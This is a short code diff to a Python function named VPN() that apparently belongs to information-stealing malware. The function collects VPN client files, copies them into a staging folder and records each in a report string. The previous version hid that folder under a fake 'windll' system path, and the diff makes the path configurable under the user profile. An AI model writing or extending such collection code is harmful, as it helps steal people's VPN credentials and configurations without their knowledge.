@@ -15,6 +15,7 @@ from os.path import exists
 from glob import glob
 from shutil import copy
 from manager.logger import Log
+from preferences.config import config
 
 def VPN():
     data= ""
@@ -45,10 +46,12 @@ def VPN():
     
     if logs:
             try:
-                mkdir(rf'{local}\windll\VPN')
+                user = environ['USERPROFILE']
+                pathToLogs = f'{user}\\{config.pathToLogs}\\VPN'
+                mkdir(pathToLogs)
                 for key, value in logs.items():
-                    mkdir(rf'{local}\windll\VPN/'+key+'\\')
-                    copy(value, rf'{local}\windll\VPN/'+key+'\\')
+                    mkdir(f'{pathToLogs}\\'+key+'\\')
+                    copy(value, f'{pathToLogs}\\'+key+'\\')
                     data += f"\n∟⛓{key}"
             except Exception as e:
                 Log(f"VPN(write) ---> {e}")
